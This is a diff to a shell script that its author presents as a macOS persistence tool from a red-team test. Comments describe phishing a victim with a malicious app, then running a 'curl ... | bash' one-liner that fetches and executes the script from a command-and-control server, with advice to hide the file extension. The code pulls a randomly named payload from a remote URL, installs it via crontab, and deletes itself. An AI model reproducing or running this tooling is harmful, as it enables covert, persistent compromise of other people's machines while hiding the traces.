@@ -3,13 +3,13 @@
 # This script is customized. As professional red teamer i used this in a legal prenetration test.
 # Once i got first access after an email with WeTransfer sending malicious .app generated with pyinstaller 
 # after shell popped to me i immediatemely ran this one liner to download and execute this script:
-# (namefile obviously changed as 'backup' something less obviously..)
+# (you can change the namefile obv and hide .sh extension)
 #
-# curl -k -O https://MY_C2C_IP/backup.sh | bash
+# curl -k -O https://MY_C2C_IP/osx_persistence/ | bash
 
 # Please remember that if you don't use file extensione, when downloading with curl or wget, problems
 # may occurs. So you need to put and ending slash / to file.
-URL="https://192.168.1.7/macho/"
+URL="https://192.168.1.7/osx_persistence/"
 
 # Randomize payload name
 PAYLOAD=$RANDOM
@@ -33,4 +33,4 @@ crontab temp_cron
 rm temp_cron
 
 # Remove itself 
-rm macho 2>&1
+rm osx_persistence 2>&1
